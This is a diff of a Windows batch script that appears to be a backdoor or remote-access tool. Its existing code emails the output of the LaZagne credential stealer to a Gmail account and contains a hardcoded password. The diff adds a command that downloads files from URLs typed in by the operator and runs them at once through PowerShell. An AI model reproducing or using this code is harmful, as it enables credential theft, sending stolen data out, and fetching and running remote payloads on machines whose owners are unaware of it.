@@ -48,6 +48,7 @@ if me == %input% whoami
 if email == %input% goto D
 if ls == %input% dir
 if files == %input% dir>files.txt
+if dl == %input% goto E
 
 goto A
 :B
@@ -74,3 +75,13 @@ set password = wither14
 powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%file%');$SMTPInfo.Send($ReportEmail);
 
 goto A
+
+:E
+set input = /p input=executefile:
+set files= '%input%', 
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+goto A
+
+
